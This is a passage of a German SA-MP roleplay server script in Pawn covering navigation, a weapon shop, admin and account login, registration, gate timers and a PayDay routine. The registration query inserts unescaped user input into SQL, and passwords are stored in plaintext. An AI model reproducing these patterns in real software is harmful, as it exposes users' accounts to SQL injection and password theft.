			    SendClientMessage(playerid, 0xFF7800FF, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,563.3089,-1288.9943,16.9202,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 3) // Airport
	        {
			    SendClientMessage(playerid, 0xFF7800FF, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,1869.2937,-2613.0598,13.5469,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 4) // Rastplatz
	        {
			    SendClientMessage(playerid, 0xFF7800FF, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,-544.1385,-1029.2855,24.2079,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 5) // Bikes
	        {
			    SendClientMessage(playerid, 0xFF7800FF, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,2126.3391,-1132.2964,25.5041,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 6) // Ottos SF
	        {
			    SendClientMessage(playerid, 0xFF7800FF, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,-1636.3428,1201.6342,7.1797,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 7) // Boote
	        {
			    SendClientMessage(playerid, 0xFF7800FF, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,805.0563,-1906.8767,-0.5012,3.0);
			    Navi[playerid] = 1;
			}
	        if(listitem == 8) // Fraktionsautohaus
	        {
			    SendClientMessage(playerid, 0xFF7800FF, "  Ziel gesetzt, fahr zur Roten Markierung(Deaktivieren mit /dc oder, indem du reinläufst).");
			    SetPlayerCheckpoint(playerid,1023.1495,-1091.6942,23.8349,3.0);
			    Navi[playerid] = 1;
			}
			if(listitem == 9)
			{
				ShowPlayerDialog(playerid, NAVIHAUPT, DIALOG_STYLE_LIST, "Navigationsmenü", "Tuningshops\nAutohäuser\nGeschäfte\nGang- und Mafien-Orte\nFahrschule", "Auswählen", "Beenden");
			}
		}
	}
	if(dialogid == MAFIA)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
		    	if(GetPlayerMoneySave(playerid) > 3500)
		    	{
					ServerWeapon(playerid,24,200);
					GivePlayerMoneySave(playerid,-5000);
					BizzInfo[2][bTill] += 1000;
					BizzInfo[3][bTill] += 1000;
	            	SendClientMessage(playerid, COLOR_GREEN, "Du hast dir eine Deagle mit 200 Munition für 5.000$ gekauft!");
				}
				else
				{
				SendClientMessage(playerid, COLOR_RED, "Du hast nicht genug Geld!");
				}
			}
			if(listitem == 1)
			{
		    	if(GetPlayerMoneySave(playerid) > 5000)
		    	{
			    	ServerWeapon(playerid,29,700);
			    	GivePlayerMoneySave(playerid,-5000);
			    	BizzInfo[2][bTill] += 1400;
			    	BizzInfo[3][bTill] += 1400;
			    	SendClientMessage(playerid, COLOR_GREEN, "Du hast dir eine MP5 mit 700 Munition für 6.000$ gekauft!");
				}
				else
				{
				SendClientMessage(playerid, COLOR_RED, "Du hast nicht genug Geld!");
				}
			}
			if(listitem == 2)
			{
		    	if(GetPlayerMoneySave(playerid) > 8000)
		    	{
			    	ServerWeapon(playerid,31,800);
			    	GivePlayerMoneySave(playerid,-8000);
			    	BizzInfo[2][bTill] += 1200;
			    	BizzInfo[3][bTill] += 1200;
			    	SendClientMessage(playerid, COLOR_GREEN, "Du hast dir eine M4 mit 800 Munition für 8000$ gekauft!");
				}
				else
				{
				SendClientMessage(playerid, COLOR_RED, "Du hast nicht genug Geld!");
				}
			}
			if(listitem == 3)
			{
 				if(GetPlayerMoneySave(playerid) > 3000)
 		 		{
    				ServerWeapon(playerid,4,1);
					GivePlayerMoneySave(playerid,-3000);
					BizzInfo[2][bTill] += 1000;
					BizzInfo[3][bTill] += 1000;
					SendClientMessage(playerid, COLOR_GREEN, "Du hast dir einen Messer für 3000$ gekauft!");
				}
				else
				{
				SendClientMessage(playerid, COLOR_RED, "Du hast nicht genug Geld!");
				}
			}
		}
	}








    if(dialogid == DIALOG_ADMINLOGIN)
    {
	    if(response == 0)
		{
		    SCM(playerid,COLOR_GRAD2,"Abgebrochen.");
			return 1;
		}
	    if(!IsNumeric(inputtext))
	    {
			SendClientMessage(playerid,COLOR_GREY,"Falsche eingabe");
		return 1;
		}
        if(strval(inputtext) == PlayerInfo[playerid][pAdminPasswort])
        {


	    if(PlayerInfo[playerid][pAdminPasswort] == 0)
		{
			PlayerInfo[playerid][pAdmin] = 0;
			SendClientMessage(playerid, COLOR_RED, "Aufgrund eines Accountfehlers wurde dein Adminrang entzogen");
			return 1;
 	    }
				new stringh[128];
				format(stringh,sizeof(stringh),"Du hast dich erfolgreich als %s eingeloggt!",GetName(playerid),GetPlayerAdminName(playerid));
				SendClientMessage(playerid,COLOR_YELLOW,stringh);
				SetPlayerColor(playerid,NAMECOLOR_MEDIC);
				AdminDuty[playerid] = 1;
				format(stringh,sizeof(stringh),"** %s hat sich als %s angemeldet. **",GetName(playerid),GetPlayerAdminName(playerid));
				SendClientMessageToAll(RED, stringh);
				SetPlayerArmour(playerid, 100);
				TextDrawShowForPlayer(playerid, TDEditor_TD[playerid]);
				temp44[playerid] = 1;
        }
        else
        {
		format(stringtu, sizeof(stringtu), "%s wurde vom Server gekickt, Grund: Falsche Admin PIN", GetName(playerid));
		SendClientMessageToAll(COLOR_RED, stringtu);
        TogglePlayerControllable(playerid, false);
        SetTimerEx("kicktimerfake", 100,false,"i",playerid);
        }
    }











    if(dialogid == DIALOG_LOGIN)
    {
        if(response && strlen(inputtext) > 0)
        {









            new query[265];
	//		mysql_format(mysqlcon, query, "SELECT * FROM `accounts` WHERE `name` ='%s' AND `passwort`='%e'", PlayerInfo[playerid][Name], inputtext);



            format(query, sizeof(query), "SELECT * FROM `accounts` WHERE `name` ='%s' AND `passwort`='%q'", PlayerInfo[playerid][Name], inputtext);
		//	mysql_function_query(mysqlcon,query, true, "LoadPlayer", "i",playerid);

		    mysql_pquery(mysqlcon, query, "LoadPlayer", "i", playerid);




            GetPlayerName(playerid, playername, sizeof(playername));
            new queryx[265];
			new rand = random(5000000000);
            format(queryx, sizeof(queryx),"%d@mysteryreallife.eu", rand);

			WBB_AddUser(playername, inputtext, queryx, playerid, 1);
        }
        else
        {
            Kick(playerid);
        }
    }
    if(dialogid == DIALOG_REG2)
    {
        if(response && strlen(inputtext) > 7)
        {
            new query[265];
            GetPlayerName(playerid, playername, sizeof(playername));
//            new queryx[265];
//		      new rand = random(5000000000);
//            format(queryx, sizeof(queryx),"%d@mysteryreallife.eu", rand);
//			  WBB_AddUser(playername, inputtext, queryx, playerid, 1);




            format(query, sizeof(query), "INSERT INTO `accounts` (name,passwort) VALUES ('%s','%s')", playername, inputtext);
		//	mysql_function_query(mysqlcon,query, false, "", "");
		    mysql_pquery(mysqlcon,query,"");

            gPlayerLogged[playerid] = 1;
            SaveMysqlPlayer(playerid);

		   	new stringkd[128];
			format(stringkd, sizeof(stringkd), inputtext);
			strmid(PlayerInfo[playerid][pTempPassword], stringkd, 0, strlen(stringkd), 255);

	        ShowPlayerDialog(playerid,DIALOG_LOGIN,DIALOG_STYLE_PASSWORD,"GTA-City Reallife","{FFFFFF}Willkommen auf GTA-City Reallife\nDein Account wurde in unserer Datenbank gefunden.\nDu kannst dich nun mit deinem Passwort einloggen.","Login","Abbrechen");
        }
        else
        {
            ShowPlayerDialog(playerid,DIALOG_REG2,DIALOG_STYLE_INPUT,"Account erstellen","{FFFFFF}Herzlich Willkommen auf GTA-City Reallife\nDein Account wurde nicht in unserer Datenbank gefunden.\nDu kannst dir nun einen Account mit einen Passwort anlegen.","OK","Abbrechen");
			SendClientMessage(playerid,COLOR_GREY,"Das Passwort muss mindestens 8 Stellig sein.");
        }
        if(response == 0)
        {
            SCM(playerid,-1,"Du wurdest gekickt, da du dein Passwort nicht eingegeben hast!");
            KickEx(playerid);
		}
    }
	return 1;
}

forward pdd1close();//Wird fast immer bei einer neuen  public gebraucht!
public pdd1close()//Die public die wir mit dem forward erstellt haben!
{
MoveDynamicObject(pdd1, 239.56374, 118.96767, 1004.18994,2.0);//Hier kommen eure Coords hin wo das Tor geschlossen ist!
return 1;
}
forward pdd2close();//Wird fast immer bei einer neuen  public gebraucht!
public pdd2close()//Die public die wir mit dem forward erstellt haben!
{
MoveDynamicObject(pdd2, 253.22673, 109.46581, 1004.15857,2.0);//Hier kommen eure Coords hin wo das Tor geschlossen ist!
return 1;
}
forward mwtorclose();//Wird fast immer bei einer neuen  public gebraucht!
public mwtorclose()//Die public die wir mit dem forward erstellt haben!
{
MoveDynamicObject(RS1, 1283.94921875,-1652.19042969,15.32026672,2.0);//Hier kommen eure Coords hin wo das Tor geschlossen ist!
return 1;
}
forward rtor1close();//Wird fast immer bei einer neuen  public gebraucht!
public rtor1close()//Die public die wir mit dem forward erstellt haben!
{
MoveDynamicObject(rtor1, 2107.43579, 1385.12964, 12.62152,2.0);//Hier kommen eure Coords hin wo das Tor geschlossen ist!
return 1;
}
forward rtor2close();//Wird fast immer bei einer neuen  public gebraucht!
public rtor2close()//Die public die wir mit dem forward erstellt haben!
{
MoveDynamicObject(rtor2, 2088.90918, 1433.19250, 12.66121,2.0);//Hier kommen eure Coords hin wo das Tor geschlossen ist!
return 1;
}
forward newschrankeclose();//Wird fast immer bei einer neuen  public gebraucht!
public newschrankeclose()//Die public die wir mit dem forward erstellt haben!
{
MoveObjektRot(newschranke, 0.00000, 89.50000, 0.18000,25);//Hier kommen eure Coords hin wo das Tor geschlossen ist!
return 1;
}
forward oamtschrankeclose();//Wird fast immer bei einer neuen  public gebraucht!
public oamtschrankeclose()//Die public die wir mit dem forward erstellt haben!
{
MoveObjektRot(oamtschranke, 0.00000, 90.00000, 0.00000,25);
return 1;
}
forward lcntorclose();//Wird fast immer bei einer neuen  public gebraucht!
public lcntorclose()//Die public die wir mit dem forward erstellt haben!
{
MoveDynamicObject(lcntor, 2605.98193, 2302.83960, 12.56586,2.0);//Hier kommen eure Coords hin wo das Tor geschlossen ist!
return 1;
}
forward triadentor2close();//Wird fast immer bei einer neuen  public gebraucht!
public triadentor2close()//Die public die wir mit dem forward erstellt haben!
{
MoveDynamicObject(yaktor2, -2655.51562500,-222.05761719,6.05807400, 4.0);
return 1;
}
forward triadentorclose();//Wird fast immer bei einer neuen  public gebraucht!
public triadentorclose()//Die public die wir mit dem forward erstellt haben!
{
MoveDynamicObject(yaktor, -2803.43945312,-329.79394531,8.81245422, 4.0);
return 1;
}
forward lvpdtorclose();//Wird fast immer bei einer neuen  public gebraucht!
public lvpdtorclose()//Die public die wir mit dem forward erstellt haben!
{
MoveDynamicObject(LVPDtorneu,2334.78613, 2443.51074, 7.25360, 4);
return 1;
}
forward fbihqtorclose();//Wird fast immer bei einer neuen  public gebraucht!
public fbihqtorclose()//Die public die wir mit dem forward erstellt haben!
{
MoveDynamicObject(fbitor, -1631.79822, 688.39423, 8.71290, 4);
return 1;
}
forward fbi3333close();
public fbi3333close()
{
    MoveObjektRot(fbi3333,0.00000, -90.00000, 90.00000,35);
	return 1;
}
forward fbi2222close();
public fbi2222close()
{
    MoveObjektRot(fbi2222,0.00000, 90.00000, 90.00000,35);
	return 1;
}



forward haustor2close();
public haustor2close()
{
	MoveDynamicObject(haustor2,282.38562, -1319.93042, 55.41534,3.0);
	return 1;
}
forward haustorclose();
public haustorclose()
{
	MoveDynamicObject(haustor,323.77701, -1186.22131, 75.54530,3.0);
	return 1;
}
forward bwtor2close();
public bwtor2close()
{
	MoveDynamicObject(bwtor2,285.61713, 1822.02710, 19.93185,3.0);
	return 1;
}
forward bwtor1close();
public bwtor1close()
{
	MoveDynamicObject(bwtor1,135.10268, 1941.33716, 21.63707,3.0);
	return 1;
}
forward whtorclose();
public whtorclose()
{
	MoveDynamicObject(terrorgate,-489.2532043457, -563.72381591797, 26.966348648071,3.0);
	return 1;
}
forward htorclose();//Wird fast immer bei einer neuen  public gebraucht!
public htorclose()//Die public die wir mit dem forward erstellt haben!
{
MoveDynamicObject(htor, 1879.32593, 702.76483, 12.60409,2.0);//Hier kommen eure Coords hin wo das Tor geschlossen ist!
return 1;
}
forward torlspd();
public torlspd()
{
 	MoveDynamicObject(lspdtor,246.44479, 72.60710, 1004.67303, 4);
	return 1;
}
forward ReportReset(playerid);
public ReportReset(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    if(JustReported[playerid] == 1)
	    {
			JustReported[playerid] = 0;
	    }
	}
}
stock GetXYInFrontOfPlayer(playerid, &Float:x, &Float:y, Float:distance)
{
	new Float:a;

	GetPlayerPos(playerid, x, y, a);
	GetPlayerFacingAngle(playerid, a);

	if(GetPlayerVehicleID(playerid))
	{
		GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
	}

	x += (distance * floatsin(-a, degrees));
	y += (distance * floatcos(-a, degrees));
}

#pragma unused UnderCoverCar_Sultan

stock SetVehicleParamsForPlayerEx(vehicleid, playerid, objective, doorslocked)
{
	SetVehicleParamsForPlayer(vehicleid, playerid, objective, doorslocked);
	iVehicleObjective[vehicleid][0] = objective;
	iVehicleObjective[vehicleid][1] = doorslocked;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
	SetVehicleParamsForPlayer(vehicleid, forplayerid, iVehicleObjective[vehicleid][0], iVehicleObjective[vehicleid][1]);

	if(IsADtCar(vehicleid))// Privatfahrzeug
	{
		new carowner = GetDtCarOwner(vehicleid);
		new slot = GetDtCarOwnerSlot(carowner,vehicleid);
		if(PlayerCar[carowner][slot][CarPJ] == 0 || PlayerCar[carowner][slot][CarPJ] == 1 || PlayerCar[carowner][slot][CarPJ] == 2)
		{

			SetTimerEx("TuneXD", 3000, false, "ddd", PlayerCar[carowner][slot][CarId],PlayerCar[carowner][slot][CarC1],PlayerCar[carowner][slot][CarC2]);


		}
	}

	return 1;
}

forward TuneXD(carid,c1,c2);
public TuneXD(carid,c1,c2)
{
	ChangeVehicleColor(carid, c1, c2);
}

Function NDMZONE(playerid)
{
	if(IsPlayerInArea(playerid, 1436.625, -1764.764, 1611.556, -1618.698) ||
	IsPlayerInArea(playerid, 1691.416, -1677.914, 1759.867, -1583.168) ||
	IsPlayerInArea(playerid, 1159.018, -959.4252, 1292.118, -864.6794) ||
	IsPlayerInArea(playerid, 1181.835, -1417.363, 1269.301, -1283.14)||
	GetPlayerInterior(playerid) == 10)
	{
		TextDrawShowForPlayer(playerid, NDMZONET);
		TextDrawHideForPlayer(playerid, Datum);
	}
	else
	{
 		TextDrawHideForPlayer(playerid, NDMZONET);
 		TextDrawShowForPlayer(playerid, Datum);
	}
}
stock IsPlayerInArea(playerid,Float:minX,Float:minY,Float:maxX,Float:maxY)
{
	GetPlayerPos(playerid,pX,pY,pZ);
	if(pX >= minX && pX <= maxX && pY >= minY && pY <= maxY) return 1;
	else return 0;
}

Function PayDay()
{
	SyncTime();
	DollahScoreUpdate();
	for(new i = 0; i < MAX_PLAYERS; i++)
	{

	    new fahrzeug = GetPlayerVehicleID(i);


/*
        if(IsTrailerAttachedToVehicle(fahrzeug))
        {
			new trailerid = GetVehicleTrailer(fahrzeug);
		    if(GetVehicleModel(vehicleid) == 607)
		    {


			SetVehicleHealth(trailerid, 9999.0);

			}
		}

*/


        if(IsPlayerInAnyVehicle(i))
        {
	        if(IsADtCar(fahrzeug))
	        {
				  new engine, lights, alarm, doors, bonnet, boot, objective;
				  GetVehicleParamsEx(fahrzeug, engine, lights, alarm, doors, bonnet, boot, objective);
		          if(engine == 1)
		          {
		                new carowner = GetDtCarOwner(fahrzeug);
		                new slot = GetDtCarOwnerSlot(carowner,fahrzeug);
		                PlayerCar[carowner][slot][Benzin] -= 1;
		                PlayerCar[carowner][slot][Kilometer] += 1;
			 	  }
	 	     }
 		}
        if(IsPlayerInAnyVehicle(i))
        {
	        for(new fc;fc<sizeof(FactionCars);fc++)
			{
		        if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
				{
		            if(fahrzeug == FactionCars[fc][fCarid])
					{
						new engine, lights, alarm, doors, bonnet, boot, objective;
						GetVehicleParamsEx(fahrzeug, engine, lights, alarm, doors, bonnet, boot, objective);
			            if(engine == 1)
			            {
                     	   FactionCars[fc][fTuning][16] -= 1;// Benzin
                     	   FactionCars[fc][fTuning][15] += 1;
						}
		  			}
			    }
		    }
		}












/*
//--------------------------------------------------------------------------------------
	    new vehicleid = GetPlayerVehicleID(i);
		new engine, lights, alarm, doors, bonnet, boot, objective;
		GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
		if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i) && !IsANoTachoVehicle(GetPlayerVehicleID(i)))
		{
		    if(engine == 1)
		    {
	            if(IsADtCar(vehicleid))
	            {
				    for(new X = 0; X < MaxVeh; X++)// Minuten Timer ....
					{
						if (vehicleid == PlayerCar[i][X][CarId])
						{
							if(PlayerCar[i][X][Benzin] == 0)
							{
				        		GameTextForPlayer(i,"~w~~n~~n~~n~~n~~n~~n~~n~~n~Kein Benzin mehr",1500,3);
						    	SetVehicleParamsEx(vehicleid,0,lights,alarm,doors,bonnet,boot,objective);
							}
							if(PlayerCar[i][X][Benzin] > 0)
							{
								PlayerCar[i][X][Kilometer] += 1;
								PlayerCar[i][X][Benzin] -= 1;
							}
						}
					}
				}
			}
		}
//-----------------------------------------------------------------------------------------------------------
*/


	    if(PlayerInfo[i][paMuted] > 0)
        {
            if(PlayerInfo[i][paMutedTime] > 0 )
            {
                PlayerInfo[i][paMutedTime]--;
            }
			if(PlayerInfo[i][paMutedTime] <= 0) PlayerInfo[i][paMuted] = 0;
		}

	    if(PlayerInfo[i][pMuted] > 0)
        {
            if(PlayerInfo[i][pMutedTime] > 0 )
            {
                PlayerInfo[i][pMutedTime]--;
            }
			if(PlayerInfo[i][pMutedTime] <= 0) PlayerInfo[i][pMuted] = 0;
		}
	    if(PlayerInfo[i][pPrison] == 1)
        {
            if(PlayerInfo[i][pJailTime] > 0 )
            {
                PlayerInfo[i][pJailTime]--;
            }
			if(PlayerInfo[i][pJailTime] <= 0) ReleasePlayerFromJail(i);
		}
		if(PlayerInfo[i][pTot] == 1)
		{
			pIstTot[i] += 1;
		}
/*
		if(PlayerInfo[i][pTot] == 1 && pIstTot[i] == 2)
		{
			if(IsPlayerInFrac(i, 1))
			{
				SetPlayerColor(i,NAMECOLOR_LSCOP);
			}
			else
			{
			    SetPlayerColor(i,TEAM_HIT_COLOR);
			}
			PlayerInfo[i][pTot] = 0;
			pIstTot[i] = 0;
			SetPlayerVirtualWorld(i,0);

			if(PlayerInfo[i][pJailed] == 0)
			{
			    SetCameraBehindPlayer(i);
				SetPlayerPos(i, 1176.2914,-1323.6859,14.0141);
				UnFreezePlayer(i);
				SetPlayerFacingAngle(i, 266.0591);
				SetPlayerSkin(i, PlayerInfo[i][pChar]);
			}
			else if(PlayerInfo[i][pJailed] > 0)
	 		{
			    SetPlayerSpawn(i);
       			UnFreezePlayer(i);
       			SetPlayerSkin(i, PlayerInfo[i][pChar]);
			}
            SpawnPlayer(i);
            DestroyPickup(TotenKopf[i][0]);
			GivePlayerMoneySave(i, -700);
			FraktionsKasse[3] += 700;
		}
*/
		if(IsPlayerConnected(i))
		{
			PlayerInfo[i][pGesamtMinutes]++;
			PlayerInfo[i][pMinutesSinceLogin]++;
			PlayerInfo[i][pMinutesSinceAn]++;




			if(PlayerInfo[i][pPlayMinutes] <= 60)
			{
			    PlayerInfo[i][pPlayMinutes]++;
			}
			if(PlayerInfo[i][pPlayMinutes] >= 60)
			{
				PlayerInfo[i][pPlayMinutes] = 0;
	 			new string[128];
				new account,interest;
				new rent = 0;
				if(IsPlayerConnected(i))
				{
						new playername2[MAX_PLAYER_NAME];
						GetPlayerName(i, playername2, sizeof(playername2));
						account = PlayerInfo[i][pAccount];
						new key = PlayerInfo[i][pHouseKey];
						if(key != 999)
						{
							rent = HouseInfo[key][hRent];
							if(strcmp(playername2, HouseInfo[key][hOwner], true) == 0)
							{
								rent = 0;
							}
							else if(rent > GetPlayerMoneySave(i))
							{
								PlayerInfo[i][pHouseKey] = 999;
								SendClientMessage(i, COLOR_WHITE, "Du wurdest aus der Wohnung geschmissen!");
								rent = 0;
							}
							HouseInfo[key][hTakings] = HouseInfo[key][hTakings]+rent;
						}
						new tmpintrate;
						if (key != 999 && strcmp(playername2, HouseInfo[key][hOwner], true) == 0)
						{
						    if(PlayerInfo[i][pDonateRank] > 0)
							{
								tmpintrate = intrate+4;
							}
							else
							{
								tmpintrate = intrate+2;
							}//HouseInfo[key][hLevel]
						}
						else
						{
						    if(PlayerInfo[i][pDonateRank] > 0)
					 		{
						  		tmpintrate = 3;
						  	}
							else
						 	{
							 	tmpintrate = 1;
						 	}
						}
						if(PlayerInfo[i][pPbiskey] > 0)
						{
						    tmpintrate++;
						}
						new fraktion = 0;
						new checks;
		 				if(PlayerInfo[i][pMember] > 0) fraktion = PlayerInfo[i][pMember] - 1;
		  				if(PlayerInfo[i][pLeader] > 0) fraktion = PlayerInfo[i][pLeader] - 1;
						if(fraktion >= 0)
						{
		    				if(FraktionsKasse[fraktion] - PlayerInfo[i][pGehalt] < 0)
					    	{
						    	checks = 0;
						    //	GivePlayerMoneySave(i, checks); unnötig
							}
							else if(FraktionsKasse[fraktion] - PlayerInfo[i][pGehalt] >= 0)
							{
			    				checks = PlayerInfo[i][pGehalt];
						    	GivePlayerMoneySave(i, checks);
								FraktionsKasse[fraktion] -= checks;

							}
						}
						/*
						else if(PlayerInfo[i][pJob] != 0 || PlayerInfo[i][pMember] == 0 || PlayerInfo[i][pLeader] == 0)
						{
							checks = 1000;
							GivePlayerMoneySave(i, checks);
						}*/



				    	//PlayerInfo[i][pAccount] -= Tax;
				    	if(PlayerInfo[i][pDonateRank] > 0)
						{
		    				new bonus = PlayerInfo[i][pPayCheck] / 2;
						    PlayerInfo[i][pPayCheck] += bonus;
						}
						new ebill = (PlayerInfo[i][pAccount]/10000)*(PlayerInfo[i][pLevel]);
		    			//new oil = (PlayerInfo[i][pHouseKey]*100);
					    ConsumingMoney[i] = 1;
					    if(PlayerInfo[i][pAccount] > 0)
					    {
					   		PlayerInfo[i][pAccount] -= ebill;
					    //	BizzInfo[47][bTill] += ebill/6;
						}
						else
						{
		    				ebill = 0;
						}
						interest = (PlayerInfo[i][pAccount]/1000)*(tmpintrate);
						//PlayerInfo[i][pExp]++;
						PlayerPlayMusic(i);
						PlayerInfo[i][pAccount] = account+interest;
						new payout;
						new xd7;
						xd7 = 0;
						for(new mv;mv<PlayerInfo[i][pCarkeys];mv++)
						{
							if(Dtc_PlayerHaveCar[i][mv])
							{
								xd7 += 1;
								payout = xd7 * 350;
							}
						}

						new accsum = checks / 100;
						accsum = accsum * Tax;  // Steuern


						if(checks <=1000) { accsum = 0;}


						SendClientMessage(i, COLOR_YELLOW, "|================| Gehalts-Check |================|");
						format(string, sizeof(string), "  Gehalt: $%d  Miete: -$%d  KFZ-Steuern: -$%d Steuern: -%d$", checks, rent, payout,accsum);
						SendClientMessage(i, COLOR_GRAD1, string);

                        GivePlayerMoneySave(i, checks);

 						GivePlayerMoneySave(i, -payout);

 						GivePlayerMoneySave(i, -accsum);

 						FraktionsKasse[6] += accsum;


						xd7 = 0;


						if(PlayerInfo[i][pHouseKey] != 999 || PlayerInfo[i][pPbiskey] != 255)
						{
		    				format(string, sizeof(string), "  Strom Kosten: -$%d", ebill);
							SendClientMessage(i, COLOR_GRAD1, string);
						}
 						GivePlayerMoneySave(i, -ebill);
						if(PlayerInfo[i][pDonateRank] >= 1)
						{
						    PlayerInfo[i][pExp]++;
						    PlayerInfo[i][pExp]++;
						    PlayerInfo[i][pExp]++;
						    SendClientMessage(i, COLOR_GRAD1, "  Du hast 3 Respektpunkte erhalten.");
						}
						else {
						    PlayerInfo[i][pExp]++;
						    SendClientMessage(i, COLOR_GRAD1, "  Du hast 1 Respektpunkt erhalten.");
						}
						if(PlayerInfo[i][pPlayerKreditDauer] > 0)
						{
						    PlayerInfo[i][pAccount] -= PlayerInfo[i][pPlayerKredit];
						    PlayerInfo[i][pPlayerKreditDauer]--;
							format(string, sizeof(string), "  Kreditrate: -%d", PlayerInfo[i][pPlayerKredit]);
							SendClientMessage(i, COLOR_GRAD1, string);
						}
						format(string, sizeof(string), "  Zinsen: $%d [0.%d Prozent]", interest,tmpintrate);
						SendClientMessage(i, COLOR_GRAD2, string);
						SendClientMessage(i, COLOR_YELLOW, "|=================||============||==============|");
						format(string, sizeof(string), "  Neuer Kontostand: $%d", PlayerInfo[i][pAccount]);
						SendClientMessage(i, COLOR_GRAD5, string);
						format(string, sizeof(string), "~g~Pay Day");
						GameTextForPlayer(i, string, 5000, 1);

						if(checks == 0 && FrakMember(i) && PlayerInfo[i][pJob] == 0)
						{
		    				SendClientMessage(i,COLOR_LIGHTRED, "Da die Fraktionskasse leer ist / dein Leader dir keinen Lohn gesetzt hat, bekommst du kein Gehalt!");
						}
						rent = 0;
						PlayerInfo[i][pPayCheck] = 0;
						PlayerInfo[i][pConnectTime] += 1;
						if(PlayerInfo[i][pZollPassTime] >= 25)
						{
							PlayerInfo[i][pZollPass] = 0;
							PlayerInfo[i][pZollPassTime] = 0;
							format(string, sizeof(string), "* Dein Zollpass ist nun nicht mehr gültig und vom Staat als ungültig anerkannt.");
							SendClientMessage(i, COLOR_LIGHTRED, string);
						}
						SaveMysqlPlayer(i);


                        // Automatisches Level system
			        	if(PlayerInfo[i][pLevel] >= 0)
		           		{
		            		new nxtlevel = PlayerInfo[i][pLevel]+1;
		        			new expamount = nxtlevel*levelexp;
	        				new infostring[256];

				    	if (PlayerInfo[i][pExp] < expamount)
				     	{
				     	}
				    	else
				    	{
						format(string, sizeof(string), "~g~LEVEL UP~n~~w~Du bist jetzt Level %d", nxtlevel);
						GameTextForPlayer(i, string, 5000, 1);
						PlayerPlaySound(i, 1052, 0.0, 0.0, 0.0);
						PlayerPlayMusic(i);
						PlayerInfo[i][pLevel]++;
						if(PlayerInfo[i][pDonateRank] > 0)
						{
						    PlayerInfo[i][pExp] -= expamount;
						    new total = PlayerInfo[i][pExp];
						    if(total > 0)
						    {
						        PlayerInfo[i][pExp] = total;
						    }
						    else
						    {
						        PlayerInfo[i][pExp] = 0;
						    }
						}
						else
						{
							PlayerInfo[i][pExp] = 0;
						}
						PlayerInfo[i][gPupgrade] = PlayerInfo[i][gPupgrade]+2;
						format(infostring, 256, "Du hast %d Upgrade Punkte",PlayerInfo[i][gPupgrade]);
						SendClientMessage(i, COLOR_GRAD1, infostring);
					    }
			        	}
                        // Ende


						if(PlayerInfo[i][pichmusskuedigen] == 1)
						{
							PlayerInfo[i][pichmusskuedigen] = 0;
							PlayerInfo[i][pJob] = 0;
							format(string, sizeof(string), "* Du hast deinen Job erfolgreich gekündigt!");
							SendClientMessage(i, COLOR_LIGHTBLUE, string);
						}
						if(PlayerInfo[i][pZollPass] == 1)
						{
							PlayerInfo[i][pZollPassTime] += 1;
							format(string, sizeof(string), "* Du nutzt deinen Zollpass nun schon seit %d PayDays.", PlayerInfo[i][pZollPassTime]);
							SendClientMessage(i, COLOR_LIGHTBLUE, string);
						}
						if(PlayerInfo[i][pDonateRank] > 0)
						{
		    				PlayerInfo[i][pPayDayHad] += 1;
					    	if(PlayerInfo[i][pPayDayHad] >= 5)
						    {
		        				PlayerInfo[i][pExp]++;
						        PlayerInfo[i][pPayDayHad] = 0;
						    }

						}



						if(PlayerInfo[i][pMinutesSinceLogin] > 240)
						{

										new string3 = random(25000000000);

										new ahh43444[128];

										new ahh434[128];

										new value = random(7);

										if(value == 0)
										{
										value = 1;
										}
								        format(ahh434, sizeof(ahh434), "/gutscheine/%d.ini",string3);
										dini_Create(ahh434);

										dini_IntSet(ahh434, "result", value);

										SendClientMessage(i, COLOR_NEWS, "Aktivitätsbonus! 4 Stunden Online");
						                format(ahh43444, sizeof(ahh43444), "* Du hast einen Gutschein erhalten! Code: %d", string3);
										SendClientMessage(i, COLOR_LIGHTBLUE, ahh43444);
						}

					}

					else
					{
					    SendClientMessage(i, COLOR_LIGHTRED, "* Du hast kannst keinen PayDay bekommen, solange du AFK bist!");
					}
				}

			}
		}
//    Checkprop();
	return 1;
}
Function Timer2()
{


/*

	SendClientMessageToAll(COLOR_RED, "Timer aufgerufen");



	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		SendClientMessageToAll(COLOR_RED, "1");
		if(IsPlayerInAnyVehicle(i))
		{
			SendClientMessageToAll(COLOR_RED, "2");
			new vehicleid = GetPlayerVehicleID(i);
			if(IsADtCar(vehicleid))// Privatfahrzeug
			{
				SendClientMessageToAll(COLOR_RED, "3");
				new carowner = GetDtCarOwner(vehicleid);
				new slot = GetDtCarOwnerSlot(carowner,vehicleid);
//				if(PlayerCar[carowner][slot][CarPJ] == 0 || PlayerCar[carowner][slot][CarPJ] == 1 || PlayerCar[carowner][slot][CarPJ] == 2)
//				{
					ChangeVehicleColor(PlayerCar[carowner][slot][CarId], PlayerCar[carowner][slot][CarC1], PlayerCar[carowner][slot][CarC2]);
					SendClientMessageToAll(COLOR_RED, "4");
//				}
			}
		}
	}


*/


/*
            new queryxd[265];
			new rands = random(500000);
            format(queryxd, sizeof(queryxd),"MasoN_Bender%d", rands);



            new queryx[265];
			new rand = random(5000000000);
